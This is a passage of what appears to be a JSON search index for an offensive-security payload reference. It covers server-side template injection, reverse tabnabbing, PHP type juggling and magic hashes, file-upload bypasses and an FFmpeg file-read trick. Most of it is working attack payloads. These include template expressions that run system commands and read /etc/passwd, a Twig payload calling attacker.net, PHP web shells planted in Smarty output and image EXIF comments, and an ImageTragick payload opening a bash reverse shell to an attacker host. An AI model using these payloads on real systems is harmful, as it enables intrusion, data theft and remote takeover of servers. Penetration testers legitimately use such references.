injections"},{"location":"Server%20Side%20Template%20Injection/#ruby-retrieve-etcpasswd","text":"<%= File.open('/etc/passwd').read %>","title":"Ruby - Retrieve /etc/passwd"},{"location":"Server%20Side%20Template%20Injection/#ruby-list-files-and-directories","text":"<%= Dir.entries('/') %>","title":"Ruby - List files and directories"},{"location":"Server%20Side%20Template%20Injection/#ruby-code-execution","text":"Execute code using SSTI for ERB engine. <%= system('cat /etc/passwd') %> <%= `ls /` %> <%= IO.popen('ls /').readlines() %> <% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%> <% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%> Execute code using SSTI for Slim engine. #{ %x|env| }","title":"Ruby - Code execution"},{"location":"Server%20Side%20Template%20Injection/#smarty","text":"Official website Smarty is a template engine for PHP. {$smarty.version} {php}echo `id`;{/php} //deprecated in smarty v3 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())} {system('ls')} // compatible v3 {system('cat index.php')} // compatible v3","title":"Smarty"},{"location":"Server%20Side%20Template%20Injection/#twig","text":"Official website Twig is a modern template engine for PHP.","title":"Twig"},{"location":"Server%20Side%20Template%20Injection/#twig-basic-injection","text":"{{7*7}} {{7*'7'}} would result in 49 {{dump(app)}} {{dump(_context)}} {{app.request.server.all|join(',')}}","title":"Twig - Basic injection"},{"location":"Server%20Side%20Template%20Injection/#twig-template-format","text":"$output = $twig > render ( 'Dear' . $_GET['custom_greeting'], array(\"first_name\" => $user.first_name) ); $output = $twig > render ( \"Dear {first_name}\", array(\"first_name\" => $user.first_name) );","title":"Twig - Template format"},{"location":"Server%20Side%20Template%20Injection/#twig-arbitrary-file-reading","text":"\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@ {{include(\"wp-config.php\")}}","title":"Twig - Arbitrary File Reading"},{"location":"Server%20Side%20Template%20Injection/#twig-code-execution","text":"{{self}} {{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}} {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}} {{['id']|filter('system')}} {{[0]|reduce('system','id')}} {{['id']|map('system')|join}} {{['id',1]|sort('system')|join}} {{['cat\\x20/etc/passwd']|filter('system')}} {{['cat$IFS/etc/passwd']|filter('system')}} Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is) FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }} Example with an email passing FILTER_VALIDATE_EMAIL PHP. POST /subscribe?0=cat+/etc/passwd HTTP/1.1 email=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld","title":"Twig - Code execution"},{"location":"Server%20Side%20Template%20Injection/#velocity","text":"Official website Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code. #set($str=$class.inspect(\"java.lang.String\").type) #set($chr=$class.inspect(\"java.lang.Character\").type) #set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\")) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()]) $str.valueOf($chr.toChars($out.read())) #end","title":"Velocity"},{"location":"Server%20Side%20Template%20Injection/#references","text":"https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/ Yahoo! RCE via Spring Engine SSTI Ruby ERB Template injection - TrustedSec Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger) PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax VelocityServlet Expression Language injection Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 \u2022 By phosphore RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug RCE in Hubspot with EL injection in HubL - @fyoorer Jinja2 template injection filter bypasses - @gehaxelt, @0daywork Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018 EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018 Server Side Template Injection \u2013 on the example of Pebble - MICHA\u0141 BENTKOWSKI | September 17, 2019 Server-Side Template Injection (SSTI) in ASP.NET Razor - Cl\u00e9ment Notin - 15 APR 2020 Expression Language injection - PortSwigger Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019 Handlebars template injection and RCE in a Shopify app Lab: Server-side template injection in an unknown language with a documented exploit Exploiting Less.js to Achieve RCE A Pentester's Guide to Server Side Template Injection (SSTI) Django Templates Server-Side Template Injection","title":"References"},{"location":"Tabnabbing/","text":"Tabnabbing Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one. Summary Tools More information about the vulnerability How to exploit How to hunt for it References Tools Discover Reverse Tabnabbing - Burp Extension More information about the vulnerability When tabnabbing, the attacker searches for links that are inserted into the website and are under his control. Such links may be contained in a forum post, for example. Once he has found this kind of functionality, it checks that the link's rel attribute does not contain the value noopener and the target attribute contains the value _blank . If this is the case, the website is vulnerable to tabnabbing. How to exploit 1. Attacker posts a link to a website under his control that contains the following JS code: window.opener.location = \"http://evil.com\" 2. He tricks the victim into visiting the link, which is opened in the browser in a new tab. 3. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website. 4. If the victim opens the background tab again and doesn't look at the address bar, it may happen that he thinks he is logged out, because a login page appears, for example. 5. The victim tries to log on again and the attacker receives the credentials How to hunt for it As already mentioned, you have to search for the following link formats: <a href=\"...\" target=\"_blank\" rel=\"\" /> or <a href=\"...\" target=\"_blank\" /> References Reverse Tabnabbing - OWASP, 20.10.20 Tabnabbing - Wikipedia, 20.10.20","title":"Tabnabbing"},{"location":"Tabnabbing/#tabnabbing","text":"Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one.","title":"Tabnabbing"},{"location":"Tabnabbing/#summary","text":"Tools More information about the vulnerability How to exploit How to hunt for it References","title":"Summary"},{"location":"Tabnabbing/#tools","text":"Discover Reverse Tabnabbing - Burp Extension","title":"Tools"},{"location":"Tabnabbing/#more-information-about-the-vulnerability","text":"When tabnabbing, the attacker searches for links that are inserted into the website and are under his control. Such links may be contained in a forum post, for example. Once he has found this kind of functionality, it checks that the link's rel attribute does not contain the value noopener and the target attribute contains the value _blank . If this is the case, the website is vulnerable to tabnabbing.","title":"More information about the vulnerability"},{"location":"Tabnabbing/#how-to-exploit","text":"1. Attacker posts a link to a website under his control that contains the following JS code: window.opener.location = \"http://evil.com\" 2. He tricks the victim into visiting the link, which is opened in the browser in a new tab. 3. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website. 4. If the victim opens the background tab again and doesn't look at the address bar, it may happen that he thinks he is logged out, because a login page appears, for example. 5. The victim tries to log on again and the attacker receives the credentials","title":"How to exploit"},{"location":"Tabnabbing/#how-to-hunt-for-it","text":"As already mentioned, you have to search for the following link formats: <a href=\"...\" target=\"_blank\" rel=\"\" /> or <a href=\"...\" target=\"_blank\" />","title":"How to hunt for it"},{"location":"Tabnabbing/#references","text":"Reverse Tabnabbing - OWASP, 20.10.20 Tabnabbing - Wikipedia, 20.10.20","title":"References"},{"location":"Type%20Juggling/","text":"PHP Juggling type and magic hashes PHP provides two ways to compare two variables: Loose comparison using == or != : both variables have \"the same value\". Strict comparison using === or !== : both variables have \"the same type and the same value\". PHP type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. This vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs. PHP8 won't try to cast string into numbers anymore, thanks to the Saner string to number comparisons RFC, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! The Consistent type errors for internal functions RFC will prevent things like 0 == strcmp($_GET['username'], $password) bypasses, since strcmp won't return null and spit a warning any longer, but will throw a proper exception instead. Type Juggling True statements var_dump('0010e2' == '1e3'); # true var_dump('0xABCdef' == ' 0xABCdef'); # true PHP 5.0 / false PHP 7.0 var_dump('0xABCdef' == ' 0xABCdef'); # true PHP 5.0 / false PHP 7.0 var_dump('0x01' == 1) # true PHP 5.0 / false PHP 7.0 var_dump('0x1234Ab' == '1193131'); '123' == 123 '123a' == 123 'abc' == 0 '' == 0 == false == NULL '' == 0 # true 0 == false # true false == NULL # true NULL == '' # true NULL statements var_dump(sha1([])); # NULL var_dump(md5([])); # NULL Example vulnerable code function validate_cookie($cookie,$key){ $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['$expiration'], $key); if($cookie['hmac'] != $hash){ // loose comparison return false; ... The $cookie variable is provided by the user. The $key variable is a secret and unknown to the user. If we can make the calculated hash string Zero-like, and provide \"0\" in the $cookie['hmac'], the check will pass. \"0e768261251903820937390661668547\" == \"0\" We have control over 3 elements in the cookie: - $username - username you are targeting, probably \"admin\" - $hmac - the provided hash, \"0\" - $expiration - a UNIX timestamp, must be in the future Increase the expiration timestamp enough times and we will eventually get a Zero-like calculated HMAC. hash_hmac(admin|1424869663) -> \"e716865d1953e310498068ee39922f49\" hash_hmac(admin|1424869664) -> \"8c9a492d316efb5e358ceefe3829bde4\" hash_hmac(admin|1424869665) -> \"9f7cdbe744fc2dae1202431c7c66334b\" hash_hmac(admin|1424869666) -> \"105c0abe89825a14c471d4f0c1cc20ab\" ... hash_hmac(admin|1835970773) -> \"0e174892301580325162390102935332\" // \"0e174892301580325162390102935332\" == \"0\" Magic Hashes - Exploit If the hash computed starts with \"0e\" (or \"0..0e\") only followed by numbers, PHP will treat the hash as a float. Hash \u201cMagic\u201d Number / String Magic Hash Found By / Description MD5 240610708 0e462097431906509019562988736854 @spazef0rze MD5 QNKCDZO 0e830400451993494058024219903391 @spazef0rze MD5 0e1137126905 0e291659922323405260514745084877 @spazef0rze MD5 0e215962017 0e291242476940776845150308577824 @spazef0rze MD5 129581926211651571912466741651878684928 06da5430449f8f6f23dfc1276f722738 Raw: ?T0D??o#??'or'8.N=? SHA1 10932435112 0e07766915004133176347055865026311692244 Independently found by Michael A. Cleverly & Michele Spagnuolo & Rogdham SHA-224 10885164793773 0e281250946775200129471613219196999537878926740638594636 @TihanyiNorbert SHA-256 34250003024812 0e46289032038065916139621039085883773413820991920706299695051332 @TihanyiNorbert SHA-256 TyNOQHUS 0e66298694359207596086558843543959518835691168370379069085300385 @Chick3nman512 <?php var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true) var_dump(md5('aabg7XSs') == md5('aabC9RqS')); var_dump(sha1('aaroZmOk') == sha1('aaK1STfY')); var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m')); ?> References Writing Exploits For Exotic Bug Classes: PHP Type Juggling By Tyler Borland Magic Hashes - WhiteHatSec PHP Magic Tricks: Type Juggling","title":"PHP Juggling type and magic hashes"},{"location":"Type%20Juggling/#php-juggling-type-and-magic-hashes","text":"PHP provides two ways to compare two variables: Loose comparison using == or != : both variables have \"the same value\". Strict comparison using === or !== : both variables have \"the same type and the same value\". PHP type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. This vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs. PHP8 won't try to cast string into numbers anymore, thanks to the Saner string to number comparisons RFC, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! The Consistent type errors for internal functions RFC will prevent things like 0 == strcmp($_GET['username'], $password) bypasses, since strcmp won't return null and spit a warning any longer, but will throw a proper exception instead.","title":"PHP Juggling type and magic hashes"},{"location":"Type%20Juggling/#type-juggling","text":"","title":"Type Juggling"},{"location":"Type%20Juggling/#true-statements","text":"var_dump('0010e2' == '1e3'); # true var_dump('0xABCdef' == ' 0xABCdef'); # true PHP 5.0 / false PHP 7.0 var_dump('0xABCdef' == ' 0xABCdef'); # true PHP 5.0 / false PHP 7.0 var_dump('0x01' == 1) # true PHP 5.0 / false PHP 7.0 var_dump('0x1234Ab' == '1193131'); '123' == 123 '123a' == 123 'abc' == 0 '' == 0 == false == NULL '' == 0 # true 0 == false # true false == NULL # true NULL == '' # true","title":"True statements"},{"location":"Type%20Juggling/#null-statements","text":"var_dump(sha1([])); # NULL var_dump(md5([])); # NULL","title":"NULL statements"},{"location":"Type%20Juggling/#example-vulnerable-code","text":"function validate_cookie($cookie,$key){ $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['$expiration'], $key); if($cookie['hmac'] != $hash){ // loose comparison return false; ... The $cookie variable is provided by the user. The $key variable is a secret and unknown to the user. If we can make the calculated hash string Zero-like, and provide \"0\" in the $cookie['hmac'], the check will pass. \"0e768261251903820937390661668547\" == \"0\" We have control over 3 elements in the cookie: - $username - username you are targeting, probably \"admin\" - $hmac - the provided hash, \"0\" - $expiration - a UNIX timestamp, must be in the future Increase the expiration timestamp enough times and we will eventually get a Zero-like calculated HMAC. hash_hmac(admin|1424869663) -> \"e716865d1953e310498068ee39922f49\" hash_hmac(admin|1424869664) -> \"8c9a492d316efb5e358ceefe3829bde4\" hash_hmac(admin|1424869665) -> \"9f7cdbe744fc2dae1202431c7c66334b\" hash_hmac(admin|1424869666) -> \"105c0abe89825a14c471d4f0c1cc20ab\" ... hash_hmac(admin|1835970773) -> \"0e174892301580325162390102935332\" // \"0e174892301580325162390102935332\" == \"0\"","title":"Example vulnerable code"},{"location":"Type%20Juggling/#magic-hashes-exploit","text":"If the hash computed starts with \"0e\" (or \"0..0e\") only followed by numbers, PHP will treat the hash as a float. Hash \u201cMagic\u201d Number / String Magic Hash Found By / Description MD5 240610708 0e462097431906509019562988736854 @spazef0rze MD5 QNKCDZO 0e830400451993494058024219903391 @spazef0rze MD5 0e1137126905 0e291659922323405260514745084877 @spazef0rze MD5 0e215962017 0e291242476940776845150308577824 @spazef0rze MD5 129581926211651571912466741651878684928 06da5430449f8f6f23dfc1276f722738 Raw: ?T0D??o#??'or'8.N=? SHA1 10932435112 0e07766915004133176347055865026311692244 Independently found by Michael A. Cleverly & Michele Spagnuolo & Rogdham SHA-224 10885164793773 0e281250946775200129471613219196999537878926740638594636 @TihanyiNorbert SHA-256 34250003024812 0e46289032038065916139621039085883773413820991920706299695051332 @TihanyiNorbert SHA-256 TyNOQHUS 0e66298694359207596086558843543959518835691168370379069085300385 @Chick3nman512 <?php var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true) var_dump(md5('aabg7XSs') == md5('aabC9RqS')); var_dump(sha1('aaroZmOk') == sha1('aaK1STfY')); var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m')); ?>","title":"Magic Hashes - Exploit"},{"location":"Type%20Juggling/#references","text":"Writing Exploits For Exotic Bug Classes: PHP Type Juggling By Tyler Borland Magic Hashes - WhiteHatSec PHP Magic Tricks: Type Juggling","title":"References"},{"location":"Upload%20Insecure%20Files/","text":"Upload Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code. Summary Tools Exploits Defaults extensions Upload tricks Filename vulnerabilities Picture compression Configuration Files CVE - Image Tragik CVE - FFMpeg ZIP Archive Jetty RCE References Tools Fuxploider Burp > Upload Scanner ZAP > FileUpload AddOn Exploits Defaults extensions PHP Server ```powershell .php .php3 .php4 .php5 .php7 Less known PHP extensions .pht .phps .phar .phpt .pgif .phtml .phtm .inc * ASP Server powershell .asp .aspx .config .cer and .asa # (IIS <= 7.5) shell.aspx;1.jpg # (IIS < 7.0) shell.soap `` * JSP : .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action s * Perl: .pl, .pm, .cgi, .lib * Coldfusion: .cfm, .cfml, .cfc, .dbm` Upload tricks Use double extensions : .jpg.php, .png.php5 Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): .php.jpg Random uppercase and lowercase : .pHp, .pHP5, .PhAr Null byte (works well against pathinfo() ) .php%00.gif .php\\x00.gif .php%00.png .php\\x00.png .php%00.jpg .php\\x00.jpg Special characters Multiple dots : file.php...... , in Windows when a file is created with dots at the end those will be removed. Whitespace and new line characters file.php%20 file.php%0d%0a.jpg file.php%0a Right to Left Override (RTLO): name.%E2%80%AEphp.jpg will became name.gpj.php . Slash: file.php/ , file.php.\\ , file.j\\sp , file.j/sp Multiple special characters: file.jsp/././././. Mime type, change Content-Type : application/x-php or Content-Type : application/octet-stream to Content-Type : image/gif Content-Type : image/gif Content-Type : image/png Content-Type : image/jpeg Content-Type wordlist: SecLists/content-type.txt Set the Content-Type twice: once for unallowed type and once for allowed. Magic Bytes Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application. PNG: \\x89PNG\\r\\n\\x1a\\n\\0\\0\\0\\rIHDR\\0\\0\\x03H\\0\\xs0\\x03[ JPG: \\xff\\xd8\\xff GIF: GIF87a OR GIF8; Shell can also be added in the metadata Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character \":\" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. \" file.asax:.jpg \"). This file might be edited later using other techniques such as using its short filename. The \"::$data\" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. \" file.asp::$data. \") Filename vulnerabilities Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename. Time-Based SQLi Payloads: e.g. poc.js'(select*from(select(sleep(20)))a)+'.extension LFI/Path Traversal Payloads: e.g. image.png../../../../../../../etc/passwd XSS Payloads e.g. '\"><img src=x onerror=alert(document.domain)>.extension File Traversal e.g. ../../../tmp/lol.png Command Injection e.g. ; sleep 10; Also you upload: - HTML/SVG files to trigger an XSS - EICAR file to check the presence of an antivirus Picture Compression Create valid pictures hosting PHP code. Upload the picture and use a Local File Inclusion to execute the code. The shell can be called with the following command : curl 'http://localhost/test.php?0=system' --data \"1='ls'\" . Picture Metadata, hide the payload inside a comment tag in the metadata. Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating getimagesize() and imagecreatefromgif() . JPG : use createBulletproofJPG.py PNG : use createPNGwithPLTE.php GIF : use createGIFwithGlobalColorTable.php Picture with custom metadata Create a custom picture and insert exif tag with exiftool . A list of multiple exif tags can be found at exiv2.org convert -size 110x110 xc:white payload.jpg exiftool -Copyright=\"PayloadsAllTheThings\" -Artist=\"Pentest\" -ImageUniqueID=\"Example\" payload.jpg exiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg Configuration Files If you are trying to upload files to a : - PHP server, take a look at the .htaccess trick to execute code. - ASP server, take a look at the web.config trick to execute code. Configuration files examples - .htaccess - web.config - httpd.conf - __init__.py Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file. - package.json js \"scripts\": { \"prepare\" : \"/bin/touch /tmp/pwned.txt\" } - composer.json js \"scripts\": { \"pre-command-run\" : [ \"/bin/touch /tmp/pwned.txt\" ] } CVE - Image Tragik Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1) push graphic-context viewbox 0 0 640 480 fill 'url(https://127.0.0.1/test.jpg\"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch \"hello)' pop graphic-context More payload in the folder Picture Image Magik CVE - FFMpeg FFmpeg HLS vulnerability ZIP archive When a ZIP/archive file is automatically decompressed after the upload Zip Slip: directory traversal to write a file somewhere else ```python python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15 ln -s ../../../index.php symindex.txt zip --symlinks test.zip symindex.txt ``` Jetty RCE Upload the XML file to $JETTY_BASE/webapps/ * JettyShell.xml References Bulletproof Jpegs Generator - Damien \"virtualabs\" Cauquil BookFresh Tricky File Upload Bypass to RCE, NOV 29, 2014 - AHMED ABOUL-ELA Encoding Web Shells in PNG IDAT chunks, 04-06-2012, phil La PNG qui se prenait pour du PHP, 23 f\u00e9vrier 2014 File Upload restrictions bypass - Haboob Team File Upload - Mahmoud M. Awali / @0xAwali IIS - SOAP Arbitrary File Upload Tricks In Java - pyn3rd File Upload - HackTricks Injection points in popular image formats - Daniel Kalinowski\u200c\u200c - Nov 8, 2019","title":"Upload"},{"location":"Upload%20Insecure%20Files/#upload","text":"Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.","title":"Upload"},{"location":"Upload%20Insecure%20Files/#summary","text":"Tools Exploits Defaults extensions Upload tricks Filename vulnerabilities Picture compression Configuration Files CVE - Image Tragik CVE - FFMpeg ZIP Archive Jetty RCE References","title":"Summary"},{"location":"Upload%20Insecure%20Files/#tools","text":"Fuxploider Burp > Upload Scanner ZAP > FileUpload AddOn","title":"Tools"},{"location":"Upload%20Insecure%20Files/#exploits","text":"","title":"Exploits"},{"location":"Upload%20Insecure%20Files/#defaults-extensions","text":"PHP Server ```powershell .php .php3 .php4 .php5 .php7","title":"Defaults extensions"},{"location":"Upload%20Insecure%20Files/#less-known-php-extensions","text":".pht .phps .phar .phpt .pgif .phtml .phtm .inc * ASP Server powershell .asp .aspx .config .cer and .asa # (IIS <= 7.5) shell.aspx;1.jpg # (IIS < 7.0) shell.soap `` * JSP : .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action s * Perl: .pl, .pm, .cgi, .lib * Coldfusion: .cfm, .cfml, .cfc, .dbm`","title":"Less known PHP extensions"},{"location":"Upload%20Insecure%20Files/#upload-tricks","text":"Use double extensions : .jpg.php, .png.php5 Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): .php.jpg Random uppercase and lowercase : .pHp, .pHP5, .PhAr Null byte (works well against pathinfo() ) .php%00.gif .php\\x00.gif .php%00.png .php\\x00.png .php%00.jpg .php\\x00.jpg Special characters Multiple dots : file.php...... , in Windows when a file is created with dots at the end those will be removed. Whitespace and new line characters file.php%20 file.php%0d%0a.jpg file.php%0a Right to Left Override (RTLO): name.%E2%80%AEphp.jpg will became name.gpj.php . Slash: file.php/ , file.php.\\ , file.j\\sp , file.j/sp Multiple special characters: file.jsp/././././. Mime type, change Content-Type : application/x-php or Content-Type : application/octet-stream to Content-Type : image/gif Content-Type : image/gif Content-Type : image/png Content-Type : image/jpeg Content-Type wordlist: SecLists/content-type.txt Set the Content-Type twice: once for unallowed type and once for allowed. Magic Bytes Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application. PNG: \\x89PNG\\r\\n\\x1a\\n\\0\\0\\0\\rIHDR\\0\\0\\x03H\\0\\xs0\\x03[ JPG: \\xff\\xd8\\xff GIF: GIF87a OR GIF8; Shell can also be added in the metadata Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character \":\" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. \" file.asax:.jpg \"). This file might be edited later using other techniques such as using its short filename. The \"::$data\" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. \" file.asp::$data. \")","title":"Upload tricks"},{"location":"Upload%20Insecure%20Files/#filename-vulnerabilities","text":"Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename. Time-Based SQLi Payloads: e.g. poc.js'(select*from(select(sleep(20)))a)+'.extension LFI/Path Traversal Payloads: e.g. image.png../../../../../../../etc/passwd XSS Payloads e.g. '\"><img src=x onerror=alert(document.domain)>.extension File Traversal e.g. ../../../tmp/lol.png Command Injection e.g. ; sleep 10; Also you upload: - HTML/SVG files to trigger an XSS - EICAR file to check the presence of an antivirus","title":"Filename vulnerabilities"},{"location":"Upload%20Insecure%20Files/#picture-compression","text":"Create valid pictures hosting PHP code. Upload the picture and use a Local File Inclusion to execute the code. The shell can be called with the following command : curl 'http://localhost/test.php?0=system' --data \"1='ls'\" . Picture Metadata, hide the payload inside a comment tag in the metadata. Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating getimagesize() and imagecreatefromgif() . JPG : use createBulletproofJPG.py PNG : use createPNGwithPLTE.php GIF : use createGIFwithGlobalColorTable.php","title":"Picture Compression"},{"location":"Upload%20Insecure%20Files/#picture-with-custom-metadata","text":"Create a custom picture and insert exif tag with exiftool . A list of multiple exif tags can be found at exiv2.org convert -size 110x110 xc:white payload.jpg exiftool -Copyright=\"PayloadsAllTheThings\" -Artist=\"Pentest\" -ImageUniqueID=\"Example\" payload.jpg exiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg","title":"Picture with custom metadata"},{"location":"Upload%20Insecure%20Files/#configuration-files","text":"If you are trying to upload files to a : - PHP server, take a look at the .htaccess trick to execute code. - ASP server, take a look at the web.config trick to execute code. Configuration files examples - .htaccess - web.config - httpd.conf - __init__.py Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file. - package.json js \"scripts\": { \"prepare\" : \"/bin/touch /tmp/pwned.txt\" } - composer.json js \"scripts\": { \"pre-command-run\" : [ \"/bin/touch /tmp/pwned.txt\" ] }","title":"Configuration Files"},{"location":"Upload%20Insecure%20Files/#cve-image-tragik","text":"Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1) push graphic-context viewbox 0 0 640 480 fill 'url(https://127.0.0.1/test.jpg\"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch \"hello)' pop graphic-context More payload in the folder Picture Image Magik","title":"CVE - Image Tragik"},{"location":"Upload%20Insecure%20Files/#cve-ffmpeg","text":"FFmpeg HLS vulnerability","title":"CVE - FFMpeg"},{"location":"Upload%20Insecure%20Files/#zip-archive","text":"When a ZIP/archive file is automatically decompressed after the upload Zip Slip: directory traversal to write a file somewhere else ```python python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15 ln -s ../../../index.php symindex.txt zip --symlinks test.zip symindex.txt ```","title":"ZIP archive"},{"location":"Upload%20Insecure%20Files/#jetty-rce","text":"Upload the XML file to $JETTY_BASE/webapps/ * JettyShell.xml","title":"Jetty RCE"},{"location":"Upload%20Insecure%20Files/#references","text":"Bulletproof Jpegs Generator - Damien \"virtualabs\" Cauquil BookFresh Tricky File Upload Bypass to RCE, NOV 29, 2014 - AHMED ABOUL-ELA Encoding Web Shells in PNG IDAT chunks, 04-06-2012, phil La PNG qui se prenait pour du PHP, 23 f\u00e9vrier 2014 File Upload restrictions bypass - Haboob Team File Upload - Mahmoud M. Awali / @0xAwali IIS - SOAP Arbitrary File Upload Tricks In Java - pyn3rd File Upload - HackTricks Injection points in popular image formats - Daniel Kalinowski\u200c\u200c - Nov 8, 2019","title":"References"},{"location":"Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/","text":"FFmpeg HLS vulnerability FFmpeg is an open source software used for processing audio and video formats. You can use a malicious HLS playlist inside an AVI video to read arbitrary files. Exploits 1. `./gen_xbin_avi.py file://<filename> file_read.avi` 2. Upload `file_read.avi` to some website that processes videofiles 3. (on server side, done by the videoservice) `ffmpeg -i file_read.avi output.mp4` 4. Click \"Play\" in the videoservice. 5. If you are lucky, you'll the content of `<filename>` from the server. How it works (Explanations from neex - Hackerone links) the script creates an AVI that contains an HLS playlist inside GAB2. The playlist generated by this script looks like this: #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:1.0 GOD.txt #EXTINF:1.0 /etc/passwd #EXT-X-ENDLIST To process a playlist ffmpeg concatenates all segments and processes it as single file. To determine the type of this file FFmpeg uses the first segment of the playlist. FFmpeg processes .txt files in a special way. It tries to show a screen capture of a tty printing this file. So, the playlist above will be processed as follows: FFmpeg sees #EXTM3U signature inside GAB2 chunk and determines file type as HLS playlist. The file GOD.txt doesn't even exist, but it's name is enough for FFmpeg to detect file type as .txt. FFmpeg concatenates the contents of all segments of the playlist. As only one of two segments actually exists, the result of concatenation is just the contents of the file we want to retrieve. Because the type of this concatenation is .txt, FFmpeg draws a tty that prints the file. Thanks to Hackerone - Local File Disclosure via ffmpeg @sxcurity Hackerone - Another local file disclosure via ffmpeg PHDays - Attacks on video converters:a year later, Emil Lerner, Pavel Cheremushkin Script by @neex","title":"FFmpeg HLS vulnerability"},{"location":"Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/#ffmpeg-hls-vulnerability","text":"FFmpeg is an open source software used for processing audio and video formats. You can use a malicious HLS playlist inside an AVI video to read arbitrary files.","title":"FFmpeg HLS vulnerability"},{"location":"Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/#exploits","text":"1. `./gen_xbin_avi.py file://<filename> file_read.avi` 2. Upload `file_read.avi` to some website that processes videofiles 3. (on server side, done by the videoservice) `ffmpeg -i file_read.avi output.mp4` 4. Click \"Play\" in the videoservice. 5. If you are lucky, you'll the content of `<filename>` from the server.","title":"Exploits"},{"location":"Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/#how-it-works-explanations-from-neex-hackerone-links","text":"the script creates an AVI that contains an HLS playlist inside GAB2. The playlist generated by this script looks like this: #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:1.0 GOD.txt #EXTINF:1.0 /etc/passwd #EXT-X-ENDLIST To process a playlist ffmpeg concatenates all segments and processes it as single file. To determine the type of this file FFmpeg uses the first segment of the playlist. 